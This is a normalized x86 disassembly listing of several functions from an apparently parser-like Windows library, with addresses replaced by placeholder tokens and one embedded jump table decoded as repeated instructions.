jne r-xdata
sub eax edx
push eax
push edi
jmp r-xdata
cmp eax 0x6
je r-xdata
mov ecx esi
call sub_1003e780
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10004c10
cmp [ edi + 0x14 ] 0x0
mov [ ebp - 0x4 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] 0x0
call sub_1003acf0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
lea edx [ ebp - 0x48 ]
push edx
call sub_10072850
add esp 0x8
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
jmp r-xdata
push 0xffffffff
push 0x0
lea edx [ ebp - 0x48 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_10004e10
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
cmp [ ebp - 0x38 ] 0x0
je r-xdata
inc ebx
cmp ebx [ edi + 0x14 ]
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ ebp - 0x4c ]
push eax
push 0x11
call sub_10057a30
lea eax [ ebp - 0x4c ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10012830
sub_100729d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084ccb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x1
mov [ ebp - 0x90 ] edi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
push 0x9
call sub_10057a30
add esp 0x8
xor ebx ebx
cmp [ edi + 0x1c ] 0x26
jne r-xdata
xor esi esi
cmp [ edi + 0x14 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ edi + 0x4c ]
push edx
call sub_10069d70
add esp 0x8
cmp eax ebx
je r-xdata
mov edx [ edi + 0x10 ]
mov eax [ edx + esi * 4 ]
push eax
call sub_100729d0
inc esi
add esp 0x4
cmp esi [ edi + 0x14 ]
jb r-xdata
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_1003e780
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] ebx
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ edx + ecx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_10002c6e
push ecx
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_100285b0
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x54 ]
call sub_1000bc60
lea edx [ ebp - 0x38 ]
push edx
push 0x12
call sub_10057a30
lea eax [ ebp - 0x38 ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x54 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
call sub_100021f0
add esp 0xc
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
cmp al bl
je r-xdata
cmp edi esi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov edx [ ebp - 0x90 ]
mov eax [ edx + 0x10 ]
mov esi [ eax ]
lea ecx [ ebp - 0x18 ]
push ecx
push 0xa
call sub_10057a30
lea edx [ ebp - 0x18 ]
push edx
add esi 0x4c
push esi
call sub_10069d70
mov eax [ eax + 0x10 ]
add esp 0x10
push eax
lea ecx [ ebp - 0x70 ]
call sub_10004c10
lea ecx [ ebp - 0x20 ]
push ecx
push 0x5
mov [ ebp - 0x4 ] 0x1
call sub_10057a30
lea eax [ ebp - 0x20 ]
add esp 0x8
lea edx [ eax + 0x1 ]
jmp r-xdata
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
mov edi [ ebp - 0x90 ]
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov ecx [ ebp - 0x54 ]
push ecx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
cmp eax ebx
sub eax edx
push eax
push ebx
lea edx [ ebp - 0x20 ]
push edx
lea ecx [ ebp - 0x70 ]
call sub_100198e0
push 0xffffffff
add eax 0x7
push eax
lea eax [ ebp - 0x8c ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10028bd0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_1003acf0
lea ecx [ ebp - 0x8c ]
call sub_10003250
lea ecx [ ebp - 0x70 ]
call sub_10003250
sub_10072c30
push ebp
mov ebp esp
push 0xffffffff
push sub_10084d2e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xb0 ] ebx
xor esi esi
cmp [ ebx ] 0x1
mov [ ebp - 0x4 ] esi
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
push 0xb
call sub_10057a30
mov edx [ ebx + 0x1c ]
add esp 0x8
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebx + 0x4c ]
push ecx
call sub_10069d70
add esp 0x8
cmp eax esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
jmp r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0xe
call sub_10057a30
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x24 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x14 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x54 ] 0x0
lea esi [ eax + 0x1 ]
lea esp [ esp ]
call sub_1000a86e
add esp 0x4
mov edx [ ebp + 0x10 ]
push edx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x24 ]
push edx
call sub_1003e780
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_10072c30
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_1003e780
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ ecx + edx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_10002c6e
push ecx
push eax
lea edx [ ebp - 0xb4 ]
push edx
call sub_100285b0
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_1000bc60
cmp [ ebp + 0x24 ] 0x10
mov edx [ ebp + 0x10 ]
jae r-xdata
lea eax [ ebp - 0x54 ]
mov esi [ ebp - 0x44 ]
mov edi [ ebp + 0x20 ]
mov ecx esi
cmp esi edi
jb r-xdata
lea edx [ ebp + 0x10 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx edi
push ecx
push edx
push eax
call sub_100021f0
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp esi edi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push 0x8
call sub_10057a30
lea edx [ ebp - 0x38 ]
push edx
lea eax [ ebp - 0x54 ]
push eax
call sub_10044a40
add esp 0x10
test al al
je r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x54 ]
push edx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x24 ]
push edx
push 0x4
call sub_10057a30
lea eax [ ebp - 0x24 ]
add esp 0x8
lea edx [ eax + 0x1 ]
nop
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
test eax eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push 0xd
call sub_10057a30
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x18 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0xb4 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_1003e780
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_10072c30
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
push ecx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call sub_100021f0
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp edi esi
jae r-xdata
mov edx [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0x8c ]
push eax
call sub_10072850
mov ecx [ ebp - 0x7c ]
mov eax 0x55555556
imul ecx
mov ebx edx
shr ebx 0x1f
add ebx edx
mov edi ecx
xor ecx ecx
mov eax ebx
mov edx 0x3
mul edx
seto cl
mov [ ebp - 0x4 ] 0x2
neg ecx
or ecx eax
push ecx
call sub_1002b2d3
add esp 0xc
cmp [ ebp - 0x78 ] 0x10
mov esi eax
mov eax [ ebp - 0x8c ]
jae r-xdata
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
push edi
push eax
push esi
call sub_1007f580
xor ecx ecx
mov eax ebx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1002b2d3
add esp 0x10
mov edi eax
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x8c ]
test eax eax
xor esi esi
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0x3
cmp ebx esi
jle r-xdata
mov eax esi
mov ecx edi
mov esi ebx
lea esp [ esp ]
cmp [ ebp - 0x78 ] 0x10
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
jb r-xdata
mov eax [ rw-data ]
cmp eax 0x3
ja r-xdata
mov dx [ eax ]
mov [ ecx ] dx
mov dl [ eax + 0x2 ]
mov [ ecx + 0x2 ] dl
add eax 0x3
add ecx 0x4
dec esi
jne r-xdata
mov ebx [ ebp - 0xb0 ]
mov ecx [ ebp - 0x8c ]
push ecx
call sub_1000a86e
add esp 0x4
inc esi
cmp esi ebx
jl r-xdata
jmp [ eax * 4 + jump_table_10073268 ]
cmp [ ebp - 0x60 ] 0x0
jbe r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0xcc ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_1004ad30
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov edx [ edi + esi * 4 ]
lea eax [ ebp - 0xac ]
push eax
lea ecx [ ebp - 0xc8 ]
and edx 0xffffff
push ecx
mov ecx rw-data
mov [ ebp - 0xac ] edx
call sub_1004ad30
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ edi + esi * 4 ]
and ecx 0xffffff
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0xac ] ecx
push eax
mov ecx rw-data
call sub_1004ad30
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x14 ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_1004ad30
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xc0 ] al
mov ecx [ ebp - 0xc0 ]
jmp r-xdata
mov dl [ eax + 0x10 ]
mov [ ebp - 0xbc ] dl
mov eax [ ebp - 0xbc ]
push eax
jmp r-xdata
mov cl [ eax + 0x10 ]
mov [ ebp - 0xb8 ] cl
mov edx [ ebp - 0xb8 ]
push edx
jmp r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xb4 ] al
mov ecx [ ebp - 0xb4 ]
mov eax [ ebp - 0x70 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100198e0
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
push ecx
push 0x1
lea ecx [ ebp - 0x70 ]
call sub_10042a70
mov eax [ rw-data ]
mov ebx 0x10
cmp [ rw-data ] ebx
jae r-xdata
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100198e0
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100198e0
mov esi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100198e0
mov edi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100198e0
sub esi edi
sub esi 0x5
push esi
add eax 0x5
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10028bd0
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_1005ef00
cmp [ ebp - 0x94 ] ebx
jb r-xdata
mov eax rw-data
mov edx [ ebp - 0xa8 ]
push edx
call sub_1000a86e
add esp 0x4
sub_100732c0
push ebp
mov ebp esp
push eax
push ecx
call sub_10069d70
add esp 0x8
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov edx [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_10029cd9
add esp 0x8
neg eax
sbb eax eax
inc eax
pop ebp
retn
sub_100732f0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] ecx
cmp [ ebx + 0x4 ] edi
jbe r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
sete al
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
mov eax [ edx + edi * 4 ]
mov esi [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_10069d70
add esp 0x8
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x10 ]
mov eax esi
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
dec [ ebp - 0x4 ]
inc edi
cmp edi [ ebx + 0x4 ]
jb r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10073390
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x14
push ebx
call sub_10013bb0
push 0x58
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
call sub_10013bb0
mov esi eax
mov [ esi + 0x4 ] edi
mov [ esi ] edi
lea edi [ esi + 0x10 ]
push edi
push 0x1
push ebx
mov [ esi + 0x8 ] 0xffffffff
mov [ esi + 0xc ] 0x1
call sub_100417e0
xor eax eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] esi
push ebx
mov [ ebx + 0x4 ] eax
call sub_10064030
add esp 0x20
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10073400
push ebx
push esi
push 0x74
push edi
call sub_10013bb0
mov esi eax
lea eax [ esi + 0x48 ]
xor ebx ebx
push eax
push edi
mov [ esi ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] 0x1
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x64 ] 0x5
call sub_100503f0
lea ecx [ esi + 0x8 ]
push ecx
push 0xa
push edi
call sub_100417e0
lea edx [ esi + 0x14 ]
push edx
push 0x5
push edi
call sub_100417e0
lea eax [ esi + 0x20 ]
push eax
push 0x5
push edi
call sub_100417e0
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x70 ] ebx
add esp 0x34
mov [ edi + 0xc ] esi
pop esi
pop ebx
retn
sub_10073490
cmp [ eax + 0x4 ] 0x0
push esi
jbe r-xdata
xor eax eax
pop esi
retn
mov esi eax
lea esp [ esp ]
mov eax [ esi ]
push eax
push edi
call sub_10029cd9
add esp 0x8
mov ecx [ esi ]
mov eax edi
mov eax 0x1
pop esi
retn
add esi 0x8
cmp [ esi + 0x4 ] 0x0
ja r-xdata
sbb eax eax
sbb eax 0xffffffff
jmp r-xdata
test dl dl
je r-xdata
test ebx ebx
je r-xdata
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10073500
push edi
mov edi [ eax + 0xc ]
mov ecx [ edi + 0xc ]
dec ecx
js r-xdata
pop edi
retn
mov edx [ edi + 0x8 ]
push esi
lea esi [ edx + ecx * 4 ]
neg eax
sbb eax eax
and eax 0x6
movzx edx [ edx + lookup_table_100735e4 ]
jmp [ edx * 4 + jump_table_100735b8 ]
mov [ edi ] eax
pop esi
sub esi 0x4
dec ecx
jns r-xdata
xor edx edx
test eax eax
sete dl
lea eax [ edx * 8 + 0x6 ]
jmp r-xdata
mov eax 0xf
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xd
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xc
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xa
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xb
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x8
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x6
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x13
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x2
mov edx [ esi ]
mov edx [ edx + 0x1c ]
xor eax eax
test ecx ecx
sete al
cmp edx 0x81
ja r-xdata
pop esi
pop edi
retn
test eax eax
jne r-xdata
sub_100735ef
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
add al [ ebx ]
add al 0xa
add eax 0x7060505
pop es
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or [ edx ] cl
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or esp ecx
int3
sub_10073670
push ebp
mov ebp esp
push ebx
push esi
push edi
push r--data
mov edi eax
call sub_100386a0
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10058470
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov [ esi ] 0x28
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0xc ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi ]
mov [ esi + 0x18 ] ecx
mov [ esi + 0x1c ] 0x95
mov eax [ edi ]
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x2
jne r-xdata
mov edx [ edi + 0x18 ]
mov [ esi + 0x1c ] edx
jmp r-xdata
mov edi [ ebx + 0xc ]
mov ecx [ edi ]
lea eax [ esi + 0x24 ]
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0xc ]
push eax
push edx
push ebx
call sub_100417e0
xor ebx ebx
add esp 0xc
cmp [ edi + 0xc ] ebx
jbe r-xdata
mov eax [ edi + 0x18 ]
mov [ esi + 0x1c ] eax
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
lea ecx [ ecx ]
lea eax [ esi + 0x24 ]
push eax
mov eax [ edi + 0x8 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_10006860
inc ebx
add esp 0xc
cmp ebx [ edi + 0xc ]
jb r-xdata
sub_10073730
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
cmp [ eax ] 0x2
cmp [ eax ] 0x1
jmp r-xdata
xor eax eax
mov esi [ eax + 0x18 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx 0x96
je r-xdata
jne r-xdata
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx esi
je r-xdata
pop esi
pop ebp
retn
sub_10073780
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
push esi
xor esi esi
cmp ecx 0x96
je r-xdata
xor eax eax
pop ebp
retn
mov eax esi
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov esi 0x1
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_100737d0
push ebp
mov ebp esp
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax + 0x1c ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_100737f0
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push esi
call sub_10073780
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
retn
cmp [ esi + 0x20 ] 0x2
jne r-xdata
mov eax 0x1
retn
sub_10073820
push esi
push 0x96
push 0x2
push 0x5e
mov esi eax
push 0x5d
push esi
call sub_10073780
add esp 0x14
test eax eax
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp [ esi + 0x20 ] 0x1
je r-xdata
xor eax eax
pop esi
retn
cmp [ esi + 0x1c ] 0x5b
jne r-xdata
mov eax 0x1
pop esi
retn
add esi 0x4c
push r--data
push esi
call sub_10069d70
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_10069d70
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x10 ]
push eax
push r--data
call sub_10029cd9
add esp 0x8
neg eax
sbb eax eax
inc eax
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_10029cd9
add esp 0x8
neg eax
sbb eax eax
inc eax
je r-xdata
sub_100738b0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
or [ ebx + 0xc ] 0x400
mov ecx [ eax + 0x8 ]
add eax 0x8
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ ecx ]
dec esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp esi 0x1
jle r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov ecx 0x5f
mov edx [ ebp + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
mov [ ebx + 0x4 ] edi
mov ecx [ eax + 0x4 ]
push ebx
push edx
mov [ ebx + 0x8 ] ecx
call sub_10006860
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
call sub_10006860
add esp 0xc
dec esi
sub eax 0x4
cmp esi 0x1
jg r-xdata
cmp [ edi + 0x1c ] ecx
je r-xdata
mov edi [ eax ]
cmp [ edi ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push r--data
call sub_100386a0
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + esi * 4 - 0x4 ]
add esp 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp [ eax ] 0x1
jne r-xdata
mov edi [ ebp - 0x4 ]
mov ecx [ edi + 0x8 ]
mov edx [ eax + 0x1c ]
push ecx
push edx
call sub_1004bc00
add esp 0x4
push eax
push esi
push edi
push r--data
call sub_100386a0
mov eax [ ebp - 0x4 ]
mov edi [ edi + 0x8 ]
lea esi [ eax + 0x10 ]
push esi
push edi
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edi
call sub_10034010
lea eax [ edi + 0x1 ]
add esp 0x24
cmp eax [ esi + 0x4 ]
jae r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
mov edx [ ecx + eax * 4 ]
mov [ edx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_100739c0
push ebp
